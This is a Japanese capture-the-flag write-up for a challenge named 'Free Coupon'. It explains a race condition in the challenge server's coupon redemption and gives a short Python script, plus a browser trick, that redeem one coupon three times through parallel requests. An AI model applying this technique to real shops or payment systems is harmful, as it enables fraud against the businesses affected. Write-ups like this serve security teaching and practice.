# Free Coupon

## 問題

今すぐ無料クーポンを手に入れて、割引価格でフラグを買おう！

## 概要

残高(balance)が30以上あるとフラグを購入することができるようです。

最初の残高は0ですが、クーポンを使用する(Redeem your coupon)リンクをクリックすると、残高を10増やすことができます。

しかし、一度クーポンを使用すると使用済み(redeemed == true)になってしまいもう二度と使用できなくなってしまいます。

どうすれば残高を30にすることができるのでしょうか？

## 方針

使用済みチェックと使用済み化処理の時間差を利用してクーポンを３回使用する

## 解法

/redeemの処理を見てみると、最初に使用済みかどうかを取得した1秒後に使用済みチェックを行い、さらにその1秒後に残高増加＆使用済み化処理を行っているようです。

しかも、元の残高は最初ではなく書き換える直前に取得しているようです。

よって、同じセッションで１秒以内に３回リクエストを送ることができれば、使用済みになる前に滑り込みで使用済みチェックをすり抜け、残高を３回増やすことができるのではないかと考えました。

### ソルバー

```py
import requests
import threading

URL = "http://34.170.146.252:13561"

# いったんルートにアクセスする
s = requests.Session()
s.get(URL)

def redeem_coupon():
    s.get(URL + "/redeem")

# 並列で３回クーポンを使用する
threads = []
for _ in range(3):
    t = threading.Thread(target=redeem_coupon)
    t.start()
    threads.append(t)
# 全てのスレッドの終了を待つ
for t in threads:
    t.join()
# フラグを購入し表示する
print(s.get(URL + "/buy").text)
```

### 別解

もっと簡単にブラウザだけで解く方法もあります。

それは、「Ctrlを押しながらクーポンを使用するリンクを素早く３回クリックする（別タブで開く）」です。

最後に開いたタブの残高が30になっているので、フラグ購入(Buy a flag)リンクからフラグを取得できるようになります。
